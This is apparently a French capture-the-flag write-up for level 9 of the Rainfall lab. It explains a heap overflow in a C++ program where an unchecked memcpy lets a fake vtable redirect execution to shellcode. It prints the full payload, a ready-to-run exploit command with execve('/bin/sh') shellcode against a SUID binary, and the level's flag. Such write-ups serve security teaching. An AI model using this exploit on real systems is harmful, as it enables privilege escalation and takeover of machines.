# Rainfall - Niveau 9

## Objectif

Exploiter une vulnérabilité de type heap overflow dans un programme C++ utilisant des objets et des tables virtuelles (vtable), afin d'exécuter du shellcode et obtenir le flag.

## Structure du Programme

Le programme crée deux objets de classe `N` :

```cpp
N *obj1 = new N(5);
N *obj2 = new N(6);
```

Structure en mémoire de chaque objet `N` :

* Offset `0x00` : Pointeur vers la vtable (table des méthodes virtuelles)
* Offset `0x04` : Buffer de données (104 bytes)
* Offset `0x68` : Valeur entière (5 ou 6)

## Vulnérabilité

La fonction `N::setAnnotation()` utilise `memcpy()` sans vérifier la taille :

```cpp
void N::setAnnotation(N *this, char *param_1) {
    size_t __n = strlen(param_1);
    memcpy(this + 4, param_1, __n);
}
```

Cette copie sans contrôle permet un heap overflow, écrasant des pointeurs adjacents (notamment la vtable).

## Détail précis de la payload

La payload exploitée est :

```bash
"\x10\xa0\x04\x08" + shellcode + "A" * 76 + "\x0c\xa0\x04\x08"
```

Décomposons précisément :

* **"\x10\xa0\x04\x08"** : Première entrée de notre fausse vtable (adresse du début du shellcode dans le buffer).
* **Shellcode (28 bytes)** : Lance un shell (`execve("/bin/sh", NULL, NULL)`).
* **"A" \* 76** : Padding pour remplir le buffer jusqu’au pointeur vtable.
* **"\x0c\xa0\x04\x08"** : Adresse de notre fausse vtable, écrasant le pointeur vtable original.

## État précis de la mémoire après l'overflow

* Objet 1 (`obj1`) :

  * `0x0804a008`: \[Pointeur vtable original]
  * `0x0804a00c`: \[0x0804a010] ← Position où on écrit la fausse vtable
  * `0x0804a010`: \[Shellcode] ← Code malveillant
  * `0x0804a02c`: \[AAAAA...] Padding

* Objet 2 (`obj2`) :

  * `0x0804a074`: \[0x0804a00c] ← Pointeur vtable écrasé, pointe vers fausse vtable
  * `0x0804a078`: \[Buffer obj2]

## Mécanisme détaillé de l'exploitation

1. **Overflow du buffer** :

   * La payload dépasse les 104 bytes du buffer.
   * Écrase le pointeur vtable de `obj2` par `0x0804a00c` (notre fausse vtable).

2. **Mécanisme vtable** :

   * Lors d'un appel de méthode virtuelle (`call *%edx`), le programme lit le pointeur vtable (0x0804a00c), puis la première entrée (0x0804a010) et exécute le shellcode.

## Pourquoi une fausse vtable ?

* **Double indirection** :

  * `this` → pointeur vtable (0x0804a00c) → entrée vtable (0x0804a010) → shellcode.

Si le pointeur vtable pointait directement vers le shellcode, le programme lirait les premières instructions du shellcode comme une adresse, ce qui provoquerait un crash. En créant une fausse vtable, on contrôle parfaitement le flux d’exécution.

## Pourquoi l’exploit fonctionne

* Aucune protection moderne (ASLR, NX, stack canaries).
* Heap exécutable permettant l'exécution directe du shellcode.
* Contrôle complet du flux d’exécution via vtable falsifiée.
* Privilèges élevés du binaire (bit SUID).

## Exploit complet

```bash
./level9 $(python -c 'print("\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\x04\x08")')
```

## Résultat final (flag)

```
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

## Conclusion

Ce niveau présente une exploitation très précise impliquant la manipulation d'une vtable C++, démontrant l’importance cruciale de contrôler les tailles lors de la gestion de la mémoire dynamique. L'exploitation réussie conduit à l’exécution de code arbitraire avec des privilèges élevés, révélant ainsi le flag.
